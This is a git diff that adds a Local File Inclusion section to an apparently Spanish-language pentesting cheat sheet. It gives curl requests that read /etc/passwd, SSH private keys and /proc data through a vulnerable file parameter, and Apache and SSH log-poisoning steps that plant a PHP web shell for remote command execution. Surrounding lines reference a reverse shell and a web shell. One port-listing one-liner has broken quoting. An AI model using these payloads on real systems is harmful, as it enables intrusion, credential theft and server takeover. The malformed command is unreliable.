@@ -77,6 +77,67 @@ https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
+## LFI
+
+### PHP Wrappers 
+
+Base64
+```
+php://filter/convert.base64-encode/resource=nombre_archivo.php
+```
+### Archivos interesantes que leer
+
+Usuarios del sistema
+```
+curl -s 'http://domino/archivo.php?file=/etc/passwd'
+```
+Grupos a los que pertenecen los usuarios
+```
+curl -s 'http://domino/archivo.php?file=/etc/group'
+```
+SSH private key
+```
+curl -s 'http://domino/archivo.php?file=/home/usuario/.ssh/id_rsa'
+```
+Servicios y programas activos/corriendo en el sistema
+```
+curl -s 'http://domino/archivo.php?file=/proc/sched_debug'
+```
+IP de la máquina
+```
+curl -s 'http://domino/archivo.php?file=/proc/net/fib_trie'
+```
+Puertos abiertos internos
+``
+for port in $(curl -s 'http://domino/archivo.php?file=/proc/net/tcp' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "Puerto --> $(echo "ibase=16"; $port" | bc)"; done
+``
+
+### LFI to RCE 
+
+#### Apache Logs Poisoning
+
+Añadir en el User Agent
+```
+<?php system($_GET['cmd']); ?>
+```
+RCE
+```
+/var/log/httpd-access.log&cmd=id
+```
+```
+/var/log/apache2/access.log
+```
+#### SSH Log Poisoning
+
+Hacer petición al SSH
+```
+ssh '<?php system($_GET['cmd']); ?>'@IP
+```
+RCE
+```
+/var/log/auth.log&cmd=id
+```
+
 ## SQL Injection
 
 #### Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último valor por 'database()' para saber el nombre de la BBDD)
